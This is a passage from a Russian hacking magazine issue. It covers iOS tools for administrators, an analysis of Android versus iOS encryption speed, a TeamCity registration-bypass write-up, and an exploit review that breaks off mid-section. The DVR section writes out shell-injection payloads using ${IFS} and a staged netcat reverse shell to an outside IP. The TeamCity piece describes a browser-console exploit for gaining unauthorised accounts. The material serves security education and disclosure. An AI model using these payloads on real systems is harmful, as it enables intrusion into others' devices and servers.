В качестве альтернативы iOctocat есть и другой клиент — CodeHub. Он уже
немного более функционален, здесь можно не только просматривать, но и ре-
дактировать и добавлять новые файлы. Важная функция — быстрый переход
в веб-интерфейс из любого места программы. В остальном же возможности
обоих клиентов идентичны.
  Мобильные устройства Apple обладают возможностью работать и с база-
ми данных MySQL. Для этого предназначены несколько программ, среди них
QueryDB и Navicat. Navicat — продвинутое приложение для работы с БД. Его
стоимость — 16 долларов, что совсем немало. Однако и возможности данной
программы очень велики:
•  Создание и изменение различных баз данных. Совместная работа с БД
   с использованием сервиса Navicat Cloud.
•  Набор фильтров и поиск данных.
•  Неограниченное количество подключений с использованием SSH/SSL.
•  Инструменты для автоматизации создания баз данных.
Бесплатная утилита QueryDB — намного более простое решение. Это инстру-
мент для создания и редактирования БД. Программа имеет платную версию
с поддержкой SSH. Для того чтобы убрать рекламу, потребуется заплатить 3
доллара.

SSH И FTP-КЛИЕНТЫ
Перейдем к поиску лучших SSH-клиентов. Одно из наиболее известных реше-
ний — Prompt. Среди возможностей программы — неограниченное количество
«закладок» с данными серверов, структурирование подключений при помо-
щи папок, сохранение паролей, кастомизация интерфейса программы (тем-
ная и светлая темы, изменение размера шрифта). Верхнюю панель клавиату-
ры также можно изменять. Данные серверов синхронизируются между всеми
iOS-устройствами с использованием функции Panic Sync. Сохранение наибо-
лее используемых команд (Clips) и защита при помощи Touch ID — приятные
особенности утилиты.





                                                 Интерфейс программы Prompt
Также есть и программа для работы с FTP/SFTP-серверами под названием
Transmit. Это версия популярной Mac-утилиты для iOS-устройств. Возможно-
сти приложения таковы:
•  Подключение к серверу, переименование, добавление объектов, смена
   прав доступа и создание папок.
•  Отправка на сервер любого файла из поддерживаемых iOS-приложений.
•  Возможность передачи данных в фоновом режиме.
•  Редактирование любых документов на сервере в других iOS-программах
   при помощи технологии Document Picker.
•  Синхронизация данных серверов между устройствами.

Стоимость программы — 8 долларов.

УТИЛИТЫ ДЛЯ АНАЛИЗА СЕТИ
В задачи администратора входит и проведение диагностики сети. Для этого
в iOS также есть свои программы. Во-первых, это приложение iNetTools (есть





                                                      Стартовый экран iNetTools
бесплатная версия и платная за 5 долларов). Бесплатно в ней доступны ин-
струменты Ping, Trace, DNS Lookup, Port Scan. В платной версии есть также
функции Whois, Server Monitor, LAN Scan. В списке My Server List отображаются
все серверы, к которым ранее производилось подключение. Для начинающих
пользователей предусмотрена небольшая справочная информация.
  Для сканирования сетей предназначена утилита IP Network Scanner. Она
позволяет находить устройства в Сети, отображает Mac-адреса и IP. Для удоб-
ства поиска устройствам можно присваивать иконки и произвольные имена.
Можно открыть аппараты по найденному адресу в браузере или в любой про-
грамме, поддерживающей эту функцию. Также возможна тонкая настройка
программы, добавление устройств в список вручную, выбор стиля сканирова-
ния (отображать всю или только подтвержденную несколько раз информацию).
  К сожалению, в приложении бесплатной версии может отображаться толь-
ко пять устройств в данной сети, а остальные будут скрыты от пользователя.

ЗАКЛЮЧЕНИЕ
iOS-устройства не так и бесполезны для программистов и системных админи-
страторов. Продвинутые и функциональные редакторы кода, интерпретаторы
для многих популярных языков, утилиты для диагностики сети, клиенты для си-
стемы контроля версий, программы со справочной информацией, SSH-терми-
налы — все это и многое другое есть в данной системе.
MOBILE





                                                                                Олег Афонин,
                                                                                         Эксперт по мобильной
                                                                                      криминалистике компании
                                                                                        Элкомсофт
                                                                                                    aoleg@voicecallcentral.comANDROID
И ШИФРОВАНИЕ                 О ТОМ, КАК ВСЕ ПЛОХО
                   И ПОЧЕМУ ВРЯД ЛИ
                      СТАНЕТ ЛУЧШЕДАННЫХ
ФБР попыталось через суд выкрутить руки компании
Apple, не желающей создавать код для обхода соб-
ственной системы безопасности. Обнаружена крити-
ческая уязвимость в ядре Android, позволяющая полу-
чить доступ суперпользователя в обход всех защитных
механизмов. Эти два события хоть и не связаны между
собой, но совпали по времени, явным образом демон-
стрируя различия в системе безопасности двух по-
пулярных мобильных ОС. Отложим на минуту вопрос
с критической уязвимостью ядра Android, которая вряд
ли будет когда-либо исправлена большинством произ-
водителей в уже выпущенных моделях, и рассмотрим
механизмы шифрования данных в Android и Apple iOS.
Но прежде поговорим, зачем вообще нужно шифрова-
ние в мобильных устройствах.

ЗАЧЕМ ШИФРОВАТЬ ТЕЛЕФОН?
Честному человеку скрывать нечего — популярнейшей лейтмотив, который
звучит после каждой публикации на тему защиты данных. «Мне скрывать нече-
го», — говорят многие пользователи. Увы, но гораздо чаще под этим подразу-
мевается всего лишь уверенность в том, что уж в данные конкретного Васи Пуп-
кина никто не потрудится залезть, ибо кому они вообще интересны? Практика
показывает, что это не так. Далеко ходить не станем: буквально на прошлой
неделе увольнением завершилась карьера школьной учительницы, которая
на минутку оставила телефон на столе. Ученики мгновенно разблокировали
аппарат и извлекли из него фотографии учительницы в виде, который осужда-
ется пуританской моралью американского общества. Инцидент послужил до-
статочным основанием для увольнения учительницы. Подобные истории про-
исходят чуть ли не ежедневно.

КАК ВЗЛАМЫВАЮТСЯ НЕЗАШИФРОВАННЫЕ ТЕЛЕФОНЫ
Не будем углубляться в детали, просто имей в виду: данные с незашифрован-
ного телефона можно извлечь почти в ста процентах случаев. «Почти» здесь
относится скорее к случаям, когда телефон попытались физически повредить
или уничтожить непосредственно перед снятием данных. Во многих устрой-
ствах Android и Windows Phone есть сервисный режим, позволяющий слить все
данные из памяти аппарата через обычный USB-кабель. Это касается большин-
ства устройств на платформе Qualcomm (режим HS-USB, работающий даже
тогда, когда загрузчик заблокирован), на китайских смартфонах с процессо-
рами MediaTek (MTK), Spreadtrum и Allwinner (если разблокирован загрузчик),
а также всех смартфонов производства LG (там вообще удобный сервисный
режим, позволяющий слить данные даже с «окирпиченного» устройства).
  Но даже если в телефоне и нет сервисного «черного хода», данные
из устройства все равно можно получить, разобрав аппарат и подключив-
шись к тестовому порту JTAG. В самых запущенных случаях из устройства
извлекается чип eMMC, который вставляется в простейший и очень дешевый
адаптер и работает по тому же протоколу, что и самая обычная SD-карта.
Если данные не были зашифрованы, из телефона легко извлекается вообще
все вплоть до маркеров аутентификации, предоставляющих доступ к твоим
облачным хранилищам.
  А если шифрование было включено? В старых версиях Android (до 4.4
включительно) и это можно было обойти (за исключением, правда, аппаратов
производства Samsung). А вот в Android 5.0 наконец появился режим стойко-
го шифрования. Но так ли он полезен, как полагает Google? Попробуем ра-
зобраться.

ANDROID 5.0–6.0
Первым устройством под управлением Android 5.0 стал Google Nexus 6, вы-
пущенный в 2014 году компанией Motorola. В то время уже активно продвига-
лись 64-разрядные мобильные процессоры с архитектурой ARMv8, но у ком-
пании Qualcomm не было готового решения на этой платформе. В результате
в Nexus 6 был использован набор системной логики Snapdragon 805, основан-
ный на 32-разрядных ядрах собственной разработки Qualcomm.
   Почему это важно? Дело в том, что в процессоры на архитектуре ARMv8
встроен набор команд для ускорения потокового шифрования данных,
а в 32-битных процессорах ARMv7 таких команд нет.
   Итак, следи за руками. Инструкций для ускорения крипто в процессоре нет,
поэтому Qualcomm встроил в набор системной логики выделенный аппарат-
ный модуль, призванный выполнять те же функции. Но что-то у Google не сло-
жилось. То ли драйверы на момент выпуска не допилили, то ли Qualcomm
не предоставил исходные коды (или не разрешил публиковать их в AOSP). Де-
тали публике неизвестны, но известен результат: Nexus 6 шокировал обозре-
вателей чрезвычайно медленной скоростью чтения данных. Насколько мед-
ленной? Примерно вот так:
                      Скорость чтения/записи данных с активированным шифрованием


Причина восьмикратного отставания от «младшего брата», смартфона Motorola
Moto X 2014, проста: насильно включенное шифрование, реализованное
компанией на программном уровне. В реальной жизни пользователи Nexus
6 на оригинальной версии прошивки жаловались на многочисленные лаги
и фризы, заметный нагрев устройства и относительно слабую автономность.
Установка ядра, отключающего насильственно активированное шифрование,
разом решала эти проблемы.
   Впрочем, прошивка — дело такое, ее ведь можно и допилить, не так ли?
Особенно если ты Google, располагаешь неограниченными финансами и име-
ешь в штате самых квалифицированных разработчиков. Что ж, посмотрим, что
было дальше.
  А потом был Android 5.1 (спустя полгода), в котором нужные драйверы
для работы с аппаратным ускорителем сначала добавили в предварительной
версии прошивки, а потом снова убрали в финальной из-за серьезных про-
блем со спящим режимом. Потом был Android 6.0, на момент выхода которого
пользователи уже успели потерять интерес к этой игре и стали любыми спосо-
бами отключать шифрование, пользуясь сторонними ядрами. Или не отклю-
чать, если скорости чтения в 25–30 Мбайт/с достаточно.
ANDROID 7.0
Хорошо, но уж в Android 7 можно было исправить серьезную проблему флаг-
манского устройства, которой уже почти два года? Можно, и ее исправили!
В лаборатории «Элкомсофт» сравнили производительность двух идентичных
Nexus 6, на одном из которых была установлена версия Android 6.0.1 с ядром
ElementalX (и отключенным шифрованием), в то время как второе работало
под управлением первой предварительной версии Android 7 с настройками
по умолчанию (шифрование включено). Результат налицо:





                                                Nexus 6, Android 7 и шифрование


Несмотря на тестовый статус сборки, что-то в этой версии явно подкрутили.
Скорость последовательного чтения данных с зашифрованного раздела под-
росла с жалких 25 Мбайт/с до чуть менее жалких 39. Почему «жалких»? Даже
если сравнивать со скоростью работы аналогичного устройства с выключен-
ным шифрованием в 126 Мбайт/с, получается трехкратное падение произво-
дительности. А если сравнить со стареньким, 2013 года iPhone 5S под управ-
лением iOS? Обратимся к AnandTech:
                                                          Nexus 6 vs iPhone 5S

Разница в скорости чтения данных с зашифрованного Nexus 6 и зашифрован-
ного iPhone 5S — пять раз. Вопрос можно закрывать.

С NEXUS 6 ЧТО-ТО НЕ ТАК
Устройства линейки Nexus интересны в первую очередь тем, что прошивки
для них доступны в виде исходных кодов и могут быть исследованы и модифи-
цированы независимыми разработчиками. Один из них сумел активировать
аппаратный ускоритель шифрования в Nexus 6. Результат... обескураживаю-
щий. Даже с активированным криптосопроцессором Nexus 6 демонстрирует
чрезвычайно низкий результат:





                       Производительность Nexus 6 с активированным криптомодулем
Что ж, давай посмотрим, как обстоят дела с шифрованием в других устрой-
ствах компании Google.

В НОВЫХ УСТРОЙСТВАХ ШИФРОВАНИЕ ПОЧИНИЛИ!
С выходом в свет Android 6.0 в Google таки прописали требование активиро-
вать шифрование в 64-битных устройствах, выпущенных с Android 6 на борту
(требование не распространяется на аппараты, которые до Android 6 обно-
вились). Таких устройств пока выпущено немного, так что делать вывод о том,
приняли ли производители к сведению это требование, пока рано.
   Очевидно, компанию Google не вдохновили лавры Apple, не устроил выде-
ленный модуль ускорения крипто в топовом чипсете Qualcomm — или просто
не сложилось. Срочно понадобилось что-то новое. Не хватало, казалось, толь-
ко набора команд ускорения крипто, которые появились в ARMv8.
   Итак, выходят 64-битные Nexus 5x и 6P, базирующиеся на чипсетах
Snapdragon 808 и 810 соответственно. Так же как и Snapdragon 805, эти на-
боры системной логики оснащены высокопроизводительными выделенны-
ми модулями аппаратного ускорения шифрования. И так же, как и в Nexus 6,
разработчики из Google не смогли (или не захотели) использовать эти мо-
дули. Виноград оказался настолько зеленым и кислым, что начальник отдела
разработки официально заявил: «Мы использовали программное ускорение
шифрования, а именно — набор команд ARMv8, который обеспечивает более
высокую производительность в сравнении с аппаратным ускорителем AES,
встроенным в SoC».
   Что же такое это «программное ускорение» и почему оно «лучше», чем
использование выделенного модуля? В 64-разрядных процессорах (непо-
средственно в основных ядрах, а не в выделенном модуле, наличие которого
остается на усмотрение разработчика SoC) есть несколько инструкций, ис-
пользование которых позволяет ускорить потоковое шифрование подобно ин-
струкциям, ускоряющим кодирование и декодирование потоков видео H.264
в большинстве современных процессоров.
   Согласно официальной позиции Qualcomm, эти инструкции ни в коей мере
не могут служить полноценной заменой выделенному модулю. Тем не менее
Google (а за ней и большинство производителей) радостно начинает исполь-
зовать именно эти инструкции и начисто игнорирует встроенные в чипсеты
криптосопроцессоры.
   Результат: зашифрованные данные на таких аппаратах (даже на устройствах
начального уровня вроде Moto E 2015) читаются всего лишь в два раза мед-
леннее незашифрованных. А вот на устройствах, базирующихся на 32-битных
процессорах ARMv7, падение производительности гораздо сильнее — в четы-
ре раза.
Android 6P и скорость чтения данных





    Moto E (64 бит) vs Moto G (32 бит)
ПОЧЕМУ «ПРОГРАММНОЕ УСКОРЕНИЕ» — ЗЛО?
Отлично, просто замечательно! В 2016 году на Android зашифрованные
данные читаются всего вдвое медленнее незашифрованных и всего в пять
раз медленнее снятого с производства iPhone 5S (2013 год), в котором
шифрование активировано из коробки! Инженерам Google нужно ставить
памятник. ТАК медленно реализовать потоковое шифрование нужно сильно
постараться.
  Но скорость не главное. Основная проблема «программного» ускорения
в том, что каждый раз, когда системе нужно что-то прочитать или записать, она
вынуждена вместо микроскопического сопроцессора активировать огромные
энергоемкие ядра, насильно выводя их из спящего режима. На времени жизни
аккумулятора это сказывается однозначно негативно.
   Отвлечемся на минуту от 64-разрядных устройств и вернемся к Nexus 6.
Представь себе Snapdragon 805. Это — четыре больших ядра («больших»
по числу транзисторов, по площади — и прожорливых соответственно). А вы-
деленный ускоритель AES — это даже не малое ядро (хотя в некоторых ре-
шениях для крипто используется как раз одно из малых ядер ARM на низкой
тактовой частоте, у нас не тот случай). Теперь каждый раз, когда системе нуж-
но дописать строчку в лог-файл, активируется не отдельный маленький энер-
гоэффективный чип, а все огромное и «горячее» ядро. Пусть и на миллисе-
кунды, но пробуждается. А пишет или читает что-то Android постоянно (только
в Android 6 появился режим Doze, который снижает интенсивность работы
устройства в спящем режиме), и ядро активирует — тоже. Отсюда высокая
скорость, с которой аккумулятор разряжается в простое (и еще более высо-
кая — при работе).
  И знаешь, что самое грустное? Это референсный дизайн Google. И если
уж в Google не смогли или не захотели реализовать крипто на выделенном
сопроцессоре, то никто, ни один OEM (за исключением, возможно, Samsung)
этим заниматься тем более не будет. Ведь это не попугаи в AnTuTu, это что-то
невидимое и обычному пользователю совсем непонятное и, как показала ста-
тистика, ненужное.
  Подведем итог. Мало того, что за полтора года с выхода Nexus 6 так и не уда-
лось задействовать криптосопроцессор. Мало того, что наступили на те же
грабли в свежем последнем поколении Nexus’ов. У нас отобрали надежду
на то, что шифрование будет реализовано на уровне хотя бы трехлетней дав-
ности iPhone 5S. В Google не могут или не хотят сделать быстрое потоковое
крипто, несмотря на наличие всего необходимого — от выделенного сопро-
цессора до исходных кодов драйверов. Увы. На сегодня скорость шифрования
в Android не достигла даже того уровня, который был взят Apple три года назад.
А ЧТО У ДРУГИХ ПРОИЗВОДИТЕЛЕЙ?
Платформа Android выделяется сильнейшей фрагментацией. Разительно от-
личаются как аппаратные платформы (вплоть до используемых наборов ко-
манд — ARMv7, ARMv8, Intel x86 и x64), так и прошивки, под управлением кото-
рых работают устройства разных производителей. Учитывая все разнообразие
устройств, проверить работу аппаратного шифрования даже небольшой ча-
сти не представляется возможным. Тем не менее мы решили протестировать
еще по крайней мере один аппарат — редакционный OnePlus One (версия с 16
Гбайт) под управлением прошивки CyanogenMod.





                                                OnePlus One и шифрование данных


Скорость последовательного чтения данных после шифрования раздела ожи-
даемо упала втрое. Неожиданностью стало другое: скорость случайного до-
ступа не изменилась, а запись данных небольшими блоками стала даже бы-
стрее. Объяснения этому наблюдению у нас нет; есть комментарий. В отличие
от Nexus 6, на OnePlus One не наблюдается сильного падения производитель-
ности в сценарии, эмулирующем использование смартфона в реальных усло-
виях. Этот показатель намного более важен, чем скорость последовательного
чтения, так как отражает способ использования смартфона (что-то читается
и пишется маленькими порциями в разные участки памяти).
А ЧТО У APPLE?
А у Apple все хорошо. Даже ФБР не смогло заставить компанию взломать соб-
ственную систему. Впрочем, совместными усилиями спецслужб и специали-
зированных компаний после долгой шумихи и неудавшегося судебного про-
цесса одно старенькое устройство, не оборудованное даже Secure Enclave,
все-таки вскрыли.
   Начиная с iPhone 5S, iPad mini 2 и iPad Air, шифрование данных — неотъемле-
мая часть подсистемы безопасности Secure Enclave. Сам процесс шифрования
переложен с больших и горячих ядер основного процессора на энергоэффек-
тивный выделенный модуль. Результат? В iPhone 5S скорость последователь-
ного чтения данных — 183 Мбайт/с, а в iPhone 6 — уже 249. И это без како-
го-либо заметного влияния на скорость работы устройства или время жизни
от батарейки.

ЗАКЛЮЧЕНИЕ
Включать или не включать шифрование на смартфонах Android — дело пока
еще добровольное. Старые версии платформы предоставляют пользователям
полную свободу: воспользоваться шифрованием и терпеть резко упавшую про-
изводительность и повышенный разряд аккумулятора или не защищать данные
совсем. Закрытая ОС от Apple подобной свободы не предлагает, в обязатель-
ном порядке шифруя данные без каких-либо негативных последствий для про-
изводительности дисковой подсистемы и дополнительной нагрузки на аккуму-
лятор.
   Впрочем, окно возможностей рисковать персональными данными вот-
вот закроется и для любителей свободной ОС, ведь, начиная с шестой вер-
сии Android, Google собирается требовать от производителей обязательного
включения шифрования из коробки. Учитывая, что с точки зрения Google вино-
град так и не созрел, использование аппаратного ускорения шифрования вла-
дельцам большинства устройств не грозит (впрочем, Samsung может удивить,
самостоятельно реализовав то, чего не смогли достигнуть в Google. Вся исто-
рия шифрования на платформе Android прямо-таки кричит об этом; однако это
тема для отдельной статьи). Отдельные производители, такие как OnePlus, мо-
гут порадовать хорошей реализацией крипто в реальных сценариях исполь-
зования, так что, если защита персональных данных для тебя не пустой звук,
ты знаешь, куда смотреть. Если же выбирать между горьким и соленым не хо-
чется, почему бы не обратить внимание на устройства яблочной компании?
ВЗЛОМ



       WARNING

            Вся информация предоставлена исключительно в ознакомительных целях.
            Лица, использующие данную информацию в противозаконных целях, могут
            быть привлечены к ответственности.
EASY
HACK
                aLLy, ONSEC,
                 @iamsecurity

ОБОЙТИ ОТКЛЮЧЕННУЮ РЕГИСТРАЦИЮ
ПОЛЬЗОВАТЕЛЕЙ В TEAMCITY
Прогуливаясь по периметру в поисках новых точек входа, нередко натыкаешься
на так называемые билд-серверы. Такие штуки нужны для обеспечения непре-
рывной интеграции — это довольно удобная практика при разработке больших
проектов, когда над разными частями работают разные команды.
   Если в двух словах, то эти билд-серверы автоматизируют целый ряд рутин-
ных задач (сборка, тестирование кода перед коммитами, инспекция кода и так
далее). Попасть в такую систему для пентестера равносильно нехилому такому
джекпоту: внутри чаще всего поджидают исходники проектов компании плюс
все коммиты, доступы к репозиториям, параметры сборки проектов, списки
разработчиков и много чего еще полезного.
   Ну все, довольно скучать, переходим к делу. Я хочу рассказать об уязвимо-
сти в популярном билд-сервере TeamCity от компании JetBrains. Баг довольно
банален, однако очень опасен последствиями, потому что позволяет получить
доступ в систему.
  Дело вот в чем. С сервером можно работать через браузер. Авторизация
осуществляется с помощью обычной пары логин:пароль. Также присутствует
возможность регистрации пользователей. Однако, когда администратор в на-
стройках отключает свободную регистрацию в системе, недоступной становит-
ся только сама форма регистрации. А экшен, который непосредственно созда-
ет пользователя, эту настройку не проверяет.
   Для регистрации пользователя нам нужно отправить POST-запрос на скрипт
registerUserSubmit.html, который содержит email, имя пользователя, пу-
бличный ключ и два раза пароль в зашифрованном виде. Ключ уникален для каж-
дого посещения, и им же шифруется пароль перед отправкой. Его можно найти,
посмотрев исходный код страницы авторизации например. Ищи скрытый input
с именем publicKey.
                          Страница авторизации и publicKey для шифрования пароля


Чтобы тебе не заморачиваться со всей этой мишурой, я написал небольшой
JS-скрипт, который все сделает за тебя. Вот gist. Тебе нужно только скопиро-
вать код, открыть страницу авторизации TeamCity, открыть консоль разработ-
чика (для Хрома и Файрфокса — хоткей F12), вставить код и нажать Enter. Если
баг присутствует, то тебя зарегистрирует, авторизует и переадресует на до-





                                        Эксплоит отработал успешно. Мы в системе
машнюю страницу системы. Дальше начинай шерстить ее на предмет нужной
тебе информации. Например, я советую сразу же заглянуть в раздел Projects.
С большой долей вероятности там ты найдешь список актуальных проектов.
А щелкнув на Artifacts, скорее всего, и их исходники.
   Этот баг актуален для всех версий TeamCity вплоть до 9.0.2. На данный мо-
мент самая последняя версия 9.1.6, но, как я успел заметить, никто не спешит
обновляться. И во время тестов мне попадались такие динозавры, как 7.1. В лю-
бом случае, проверить на наличие уязвимости — дело одной минуты.
   Также хочу упомянуть о том, что часто сервер TeamCity доступен с внеш-
ки. Попробуй побрутить поддомены и виртуальные хосты. Чаще всего это tc, ci,
teamcity, tcity, ci-tc.
  На этом все, удачных аудитов.
Взлом





                                                                              Борис Рютин,
                                                                                                                             Digital Security
                                                                                                                b.ryutin@tzor.ru
                                                                                      @dukebarman
     WARNING                                                                                                dukebarman.pro

       Вся информация
     предоставлена исклю-
       чительно в ознако-
       мительных целях.
    Ни редакция, ни автор
     не несут ответственно-
      сти за любой возмож-
    ный вред, причиненный
     материалами данной
             статьи.

ОБЗОР
ЭКСПЛОЙТОВ
 АНАЛИЗ СВЕЖИХ УЯЗВИМОСТЕЙ
  В сегодняшнем обзоре мы снова затронем тему устройств CCTV/
  DVR на примере использования найденных злоумышленниками
   уязвимостей. Разберем ошибку в популярной библиотеке libotr,
 которой пользуются все шифропанки для обеспечения приватности
переписки, и закончим уязвимостью в одном из модулей фреймворка
Metasploit, который не раз бывал и, наверное, еще побывает на наших
                    виртуальных страницах.


МНОГОЧИСЛЕННЫЕ УЯЗВИМОСТИ В CCTV/DVR-УСТРОЙСТВАХ

 CVSSv2:     N/A
 Дата релиза: 22 марта 2016 года
 Автор:       Ротем Кернер
 CVE:         N/A

Продолжим тему уязвимостей в CCTV/DVR-устройствах, которую мы начали в пре-
дыдущем выпуске. Как пишет автор эксплоита, это исследование продолжает
одно из прошлых — про платежные терминалы, которое носило название «Point of
sale malware: the full story of the Backoff trojan operation». Злоумышленники посто-
янно придумывают новые направления атак — именно благодаря им взломали
DVR, которые являются ключе-
вым компонентом любой систе-
мы  камер  видеонаблюдения.
Это позволило достичь следую-
щих целей:
1. Проверить, что хост нахо-
   дится в некоем магазине.
2.  Получить отправную точку
   для атаки на локальную сеть,
    к которой подключен POS-тер-
   минал.

Забавно, что камеры наблю-
дения, которые служат первой
линией безопасности в реаль-
                                                      Снимок с CCTV в одномном мире, стали слабым зве-                                                          из магазинов
ном в виртуальном.
   После изучения темы про POS вредоносные программы у автора возникло
два вопроса.
1. Как системы видеонаблюдения работают по сети?
2.  Как они были скомпрометированы?

Используя данные, полученные из управляющего центра тысячи зараженных
устройств, автор начал проверять открытые порты и сервисы. Было обнаружено,
что, помимо открытых портов 81 и 82, доступен порт 8000. Они были идентифи-
цированы как Cross Web Server, и заглавная страница выглядела как на скрин-
шоте.
  Быстрый поиск по Shodan обнаружил около 30 тысяч устройств. Следую-
щим шагом стало определение производителя этих устройств. Были найдены
следующие файлы.
WebClient.html:



script/live.js:


Поиск по логотипу привел к небольшой израильской компании, которая про-
дает системы CCTV, но комментарии говорили о том, что производятся они
в Китае. Далее в результате исследования сайта компании была найдена сек-
ция с возможностью загрузки обновленных прошивок для DVR.

total 8684
drwx------  8 exodus exodus    4096 Feb 10 18:26 .
drwx------  8 exodus exodus   16384 Feb 10 16:08 ..
-rw-r--r--  1 exodus exodus     604 Nov  7  2012 boot.sh
drwx------  2 exodus exodus    4096 Nov  7  2012 config
-rw-r--r--  1 exodus exodus    1027 Nov  7  2012 dep2.sh
-rw-r--r--  1 exodus exodus  307561 Nov  7  2012 language.tar
-rw-r--r--  1 exodus exodus 1189984 Nov  7  2012 libhi3520a.so
drwx------  2 exodus exodus    4096 Feb  8 13:07 modules
-rw-r--r--  1 exodus exodus    2175 Nov  7  2012 netupgrade.sh
-rw-r--r--  1 exodus exodus    4852 Nov  7  2012 preupgrade.sh
drwx------  2 exodus exodus    4096 Jan  4  2015 product
-rw-r--r--  1 exodus exodus    5984 Nov  7  2012 productcheck
-rw-r--r--  1 exodus exodus      44 Nov  7  2012 rewdg.sh
-rw-r--r--  1 exodus exodus 7257480 Nov  7  2012 td3520a
drwx------  2 exodus exodus    4096 Jan  4  2015 ui
drwx------  2 exodus exodus    4096 Jan  4  2015 VideoPlay
drwx------ 34 exodus exodus    4096 Jan 27  2015 WebSites
-rw-r--r--  1 exodus exodus   51696 Nov  7  2012 XDVRStart.hisi

Внутри архива находилась файловая система. Автору требовалось найти глав-
ный процесс сервера. Первым делом был проверен загрузочный скрипт boot.sh,
который предположительно должен был выполнять все соответствующие файлы.
Он выполнял deps2.sh, а тот, в свою очередь, два бинарных файла — XVDRStart.
hisi и td3520a. Наиболее значим td3520a, он и был выбран для анализа.
  Спасибо разработчикам, которые скомпилировали его в режиме отлад-
ки, сохранив все символы и все названия функций. Это значительно облегча-
ло исследование. Далее был найден следующий уязвимый код в реализации
HTTP-сервера.





Если в URI встречается конструкция /language/[language]/index.html, то файл
берет строку из [language] и проверяет наличие директории с таким именем.
Если нет, то выполняется следующая команда:

tar -zxf /mnt/mtd/WebSites/language.tar.gz [language]/*
   -C /nfsdir/language

Такая ошибка позволяет нам удаленно выполнять любые команды.
EXPLOIT
Эксплуатация осложняется следующими проблемами:
1. Нельзя использовать пробелы или перевод на новые строки, и сервер
   не понимает URL-кодирование.
2. Длина строки между слешами ограничена.

Эти ограничения удалось обойти с помощью  ${IFS}. IFS  (Internal  Field
Separator) — это разделение полей, которое использует значение из shell.
По умолчанию он содержит символ \n. Это то, что нам нужно!
  В качестве теста была выбрана следующая команда:

/language/Swedish${IFS}&&echo${IFS}$USER>test&&tar${IFS}/string.js

И, пройдя по ссылке на созданный файл, можно было увидеть надпись «root».
Большинство встроенных систем использует BusyBox, и, скорее всего, нам до-
ступен netcat, который поможет организовать шелл. Для обхода ограничения
в длину эта атака была проведена в три этапа.
Третий:

echo nc 1.1.1.1 1234>e

Второй:

echo -e $SHELL>>e

Первый:

$(cat e) &>r

По ссылке ты можешь найти исходник эксплоит. Далее автор решил поискать
аналогичные устройства от этого китайского производителя и обнаружил око-
ло семидесяти вендоров, которые их продают. Оригинальная статья и список
вендоров с уязвимыми устройствами приведен в блоге.

TARGETS
Список возможных целей представлен в блоге автора.

SOLUTION
Об исправлениях на момент написания статьи не было известно.
ПОВРЕЖДЕНИЕ ПАМЯТИ В LIBOTR

 CVSSv2:      N/A
 Дата релиза: 9 марта 2016 года
 Автор:        X41 D-Sec, Markus Vervier
 CVE:         CVE-2016-2851

Я думаю, многие наши читатели слышали про плагины для мессенджеров вро-
де Pidgin, ChatSecure и Adium, которые добавляют поддержку OTR. Этот прото-
кол обеспечивает шифрование переписки. Однако в библиотеке libotr, которая
используется во многих мессенджерах, была найдена уязвимость.
   Атакующий может вызвать падение приложения, содержащего библиотеку,
или выполнить произвольный код, отослав OTR сообщение большого разме-
ра. Сама библиотека написана на си и представляет собой простую реализа-
цию этого протокола.
   Как пишет автор эксплоита в своем отчете, уязвимость типа удаленного вы-
полнения кода была найдена после ручного анализа исходников.
   Суть заключалась в отправке сообщений большого размера, которые вы-
зывают целочисленное переполнение, что впоследствии приводит к повреж-
дению кучи на 64-битных архитектурах.
   Когда приходит сообщение с типом OTRL_MSGSTATE_DATA во время общения
через OTR, то оно обрабатывается функцией otrl_proto_accept_data в src/
message.c:





После декодирования Base64 и получения некоторых значений из него длина
сообщения копируется в переменную с типом unsigned int в файл proto.c:



Далее с использованием read_int из proto.c проверяется, будет ли буфер
сообщения содержать количество байтов, равное datalen.


Сами макросы require_len и read_int описаны в файле src/serial.h.
Из сообщения считываются четыре байта и интерпретируются как беззнако-
вое целое число. Затем выделяется буфер размером datalen+1 с помощью
функции malloc в proto.c.





Теперь данные из сообщения копируются в буфер при помощи memmove.


Уязвимость проявляется, если из буфера сообщения считывается значение
0xFFFFFFFF (MAX_UINT). Когда datalen имеет размер 32 бита (беззнаковое це-
лое), операция datalen+1 будет обработана перед передачей в malloc. В ре-
зультате будет нулевое выделение (malloc(0)) — оно пройдет проверку в боль-
шинстве реализаций функции malloc() на 64-битных системах. В итоге четыре
гигабайта данных скопируются за пределы кучи.

EXPLOIT
Для успешной эксплуатации атакующему требуется отправить не менее 5,5
Гбайт данных для прохождения проверки require_len(datalen). Для успеш-
ного срабатывания было отправлено 275 сообщений размером по 20 Мбайт
каждое на систему с 8 Гбайт оперативной памяти и swap-файлом размером 15
Гбайт. Исходники скрипта на Python, который использовался для этого, авторы
тоже выложили в открытый доступ.

TARGETS
libotr <= 4.1.0

SOLUTION
Производитель выпустил исправление.
ДОСИМ METERPRETER

 CVSSv2:      N/A
 Дата релиза: 19 декабря 2015 года
 Автор:        x4zx
 CVE:         N/A

Мы уже как-то раз разбирали уязвимость в популярном сканере веб-уязвимо-
стей Acunetix. Самое интересное, что через нее можно было атаковать атаку-
ющего. Теперь рассмотрим подобную возможность в Meterpreter из популяр-
ного фреймворка Metasploit.
  Найденные уязвимости позволяют провести DoS-атаку на обработчик
HTTPS-запросов этой утилиты. Процесс состоит из двух шагов.
1. Используя GET-запросы к известным файлам через handler/listener и прове-
   ряя наличие строки core_patch_url, узнаем о запущенной версии утилиты.
2. Используя вредоносный или недоделанный GET-запрос к определенным файлам
   утилиты, можно попасть в открытую Meterpreter сессию и сделать так, чтобы сессии
   больше не принимались (DoS).

EXPLOIT
Виной всему порт, который использует утилита. Он доступен по URL (проверя-
лось через HTTPS-протокол).


                                              Доступный по URL порт
                                               для работы с Meterpreter


Там есть множество файлов, которые мы можем запросить через URL, и каж-
дый из них, в свою очередь, вызывает разное поведение обработчика. От со-
держания и типа получаемых файлов зависит возможность определения нали-
чия утилиты или проведения DoS-атаки.
   Запустим свой handler с полезной нагрузкой в виде шелла meterpreter
reverse_https.
Теперь попробуем получить файл chpwd.htm из listener.

$ wget -qO- --no-check-certificate https://192.168.1.1/chpwd.htm
...core_patch_url...LUDZ6djujGbWvte_gMomnQm7EQVgW7RJfg3xpGoDUgRe_
SdhLJBud68viiiDN1UsrniHZsjxLn9qYOo4YJIIU6K5ZnhNsuoGoPuWqKpQQVtxU6
L4EQg8ka9cZ4aJ-/

Ты уже заметил, что этот файл содержит строки core_patch_url и следующую
за ней, сгенерированную случайным образом. На стороне listener в логах ви-
дим следующее:

